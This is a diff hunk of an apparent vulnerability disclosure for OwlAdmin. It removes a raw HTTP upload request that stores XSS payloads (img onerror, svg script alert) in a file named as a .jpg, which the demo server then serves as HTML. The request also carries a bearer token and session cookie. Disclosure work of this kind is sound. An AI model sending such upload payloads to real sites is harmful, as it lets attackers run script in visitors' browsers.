@@ -33,34 +33,7 @@ password:admin
   http://demo.owladmin.com/storage/images/[response_value].html
   ```
   <img width="1085" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/1f529dd0-2079-4223-937f-0e1734d3a6fa">
-  Below is the vulnerability packet：
-  ```
-  POST /admin-api/upload_image? HTTP/1.1
-Host: demo.owladmin.com
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: application/json, text/plain, */*
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Authorization: Bearer 2890|CP3t2YpOcffkPKRGBV69ksHsAjQorKkLm4Ap43lP
-Content-Type: multipart/form-data; boundary=---------------------------33414486592786013281336154478
-Content-Length: 314
-Origin: http://demo.owladmin.com
-Sec-GPC: 1
-Connection: close
-Referer: http://demo.owladmin.com/admin
-Cookie: owl_amdin_demo_session=eyJpdiI6IjB5M1RrTzlnY0doRjM3SHNEd0h4L1E9PSIsInZhbHVlIjoialk1b2ZBVDV6ZG1WeDFHSWNaa3M4KzkrMnp2L0NNNkV4bk1lV2ZqZVlUbnBEMzhhS0ZXa2JZWnJScCtGMnRKMnh0dmhhWTQ4V1d2c2Y4WXk4RExQRm94cnBGUUZWMi9YK25KVmttbjdPNEJKRjlORnJ4allVR3k1Nm1Lbm4wOG4iLCJtYWMiOiI2MmM4NGIyNmNiY2ZlZmZkNzZiODgyMGY0MTJkZTVjMTBlZWYyZmFiY2RjYjU3MzdhMTE4ODg4OTBlMjIxNTY2IiwidGFnIjoiIn0%3D
-
------------------------------33414486592786013281336154478
-Content-Disposition: form-data; name="file"; filename="1.jpg"
-Content-Type: image/jpeg
-
-<img src=1 onerror=alert(console.log)>
-<ImG sRc=x onerRor=alert(1);>
-<svg><script>alert(1)</script>
------------------------------33414486592786013281336154478--
-
-  ```
-
+ 
 
 ## Impact:
 
